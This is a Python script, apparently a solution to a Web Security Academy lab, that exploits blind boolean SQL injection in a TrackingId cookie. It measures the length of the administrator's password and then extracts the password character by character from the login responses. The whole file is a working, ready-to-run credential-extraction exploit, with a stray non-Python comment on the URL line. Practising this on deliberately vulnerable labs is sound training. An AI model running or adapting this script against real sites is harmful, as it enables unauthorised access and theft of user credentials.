import requests
from bs4 import BeautifulSoup
import string
import os
import sys

#change the target url
url = 'https://ac0a1f7f1e4f057980342055008b000a.web-security-academy.net/login' // CHANGE THIS URL


#creates a session 
sess = requests.Session()


#fething the csrf, session cookie and the trackid cookie by calling the function extract_token()

def extract_token(sess,url):
        r = sess.get(url=url)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find('input', {'name':'csrf'}).get('value')
        trackid = r.cookies['TrackingId']
        session = r.cookies['session']
        return csrf, session, trackid

csrf, session, trackid = extract_token(sess,url)

#crafting the data passed on the login page
parameters = {'csrf':csrf, 'username': 'administrator', 'password': 'test'}

#set of alphanumeric characters 0-9 and a-z
test = string.printable[:36]

#initialized the starting index and buffer for the password
index = 1
password =""

#used for crafting the requests, the requests were passed in BurpSuite to check if the payload was correctly crafted
#proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


#used to find the legth of the password that will be retrieved from the database
def find_len(index):
        while True:
                payload = trackid + "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)<=" + str(index) + ")='a"
                #print((json.loads(r.text))['code'])
                #print('\nPassword:', ''.join(p))s
                #return ''.join(p)
                sess.cookies.clear()
                sess.cookies.set('TrackingId', payload)
                sess.cookies.set('session', session)
                r = sess.post(url, data=parameters)
                if "Welcome" not in r.text:
                        print("\rPassword length is greater than: " + str(index), end='', file=sys.stdout, flush=True)
                        index +=1
                        continue

                elif "Welcome" in r.text: 
                        print("\nFound password length: " + str(index))
                        break
        return index

counter = find_len(index)

#main function that extracts the password from the database
if __name__ == '__main__':
        while counter != 0:
                for t in test:
                #payload = "{is_user,admin' and substring(password,"+ "'" + str(index) + "'" +",1)="+ "'"+str(t)+ "'" +"-- -}"
                        payload = trackid +"'" + "AND (SELECT SUBSTRING(password," + str(index) + ",1) FROM users WHERE username="+"'administrator')="+"'"+str(t)
                        sess.cookies.clear()
                        sess.cookies.set('TrackingId', payload)
                        sess.cookies.set('session', session)
                        r = sess.post(url, data=parameters)
                        if "Welcome" in r.text:
                                index +=1
                                password = password + t
                                print("\rPassword: %s" %password, end='', file=sys.stdout, flush=True)
                                break
                counter -=1  
                                                                                                                                                                   
